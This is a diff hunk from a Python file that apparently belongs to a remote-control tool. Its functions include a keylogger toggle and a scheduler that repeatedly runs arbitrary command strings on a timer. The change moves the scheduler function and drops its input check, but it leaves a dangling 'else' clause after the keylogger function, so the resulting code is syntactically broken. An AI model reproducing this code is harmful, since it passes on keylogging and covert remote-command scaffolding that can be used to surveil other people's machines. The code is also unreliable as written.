@@ -487,29 +487,25 @@ def keylogger(logger,command):
 
         except:
             return 'keylogger is already off.'
-    
+        
 
-def scheduler_script(logger,command):
-    """This script will handle almost everything about scheduler.
-        listOfSchedules is a dictionary of command names that are running 
-        as keys and threading objects and seconds that the schedule runs each time as values.    
-    """
-
-    splitted_command = split_command(command)
-    if splitted_command[1] == "start":
-        if splitted_command[2].isdigit():
-            second = splitted_command[2]
-            command = ' '.join(splitted_command[3:])
-            scheduler_util = util.ScheduleManagement(int(second),
-                                                     command)
-            scheduler_util.listOfSchedules[command] = [threading.Thread(target=scheduler_util.startSchedule),
-                                                                   second]
-            scheduler_util.listOfSchedules[command][0].start() #starts threading object
-            logger.info(f"Started Schedule {command} , will run each {second} second")
-            return f"Started Schedule {command} , will run each {second} second"
 
         else:
             return "Second should be a digit"
+
+def scheduler_script(logger,command):
+    splitted_command = split_command(command)
+
+    if splitted_command[1] == "start":
+        second = splitted_command[2]
+        command = ' '.join(splitted_command[3:])
+        scheduler_util = util.ScheduleManagement(int(second),
+                                                    command)
+        scheduler_util.listOfSchedules[command] = [threading.Thread(target=scheduler_util.startSchedule),
+                                                                second]
+        scheduler_util.listOfSchedules[command][0].start() #starts threading object
+        logger.info(f"Started Schedule {command} , will run each {second} second")
+        return f"Started Schedule {command} , will run each {second} second"
 
     elif splitted_command[1] == "list":
         listOfSchedules_ToReturn = []
